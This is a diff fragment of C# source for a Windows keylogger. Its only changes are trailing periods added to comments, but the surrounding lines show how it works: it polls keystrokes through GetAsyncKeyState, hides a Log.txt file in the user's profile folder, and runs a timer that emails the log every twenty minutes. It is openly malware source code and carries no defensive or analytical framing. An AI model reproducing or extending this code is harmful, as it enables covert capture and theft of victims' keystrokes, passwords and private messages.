@@ -10,7 +10,7 @@ namespace KeyLogger
 {
     class Program
     {
-        private String path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt"; //Create new file with log info
+        private String path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt"; //Create new file with log info.
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -23,10 +23,10 @@ namespace KeyLogger
         {
             if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
             Timer t = new Timer();
-            t.Interval = 60000 * 20; //Replace the 20 for the time in minutes before the Log is sent
-            t.Elapsed += sendEmail; //Send mail when the timer finishes
-            t.AutoReset = true; //Auto restart the timer
-            t.Enabled = true; //Is the timer enabled
+            t.Interval = 60000 * 20; //Replace the 20 for the time in minutes before the Log is sent.
+            t.Elapsed += sendEmail; //Send mail when the timer finishes.
+            t.AutoReset = true; //Auto restart the timer.
+            t.Enabled = true; //Is the timer enabled.
 
             while (true)
             {
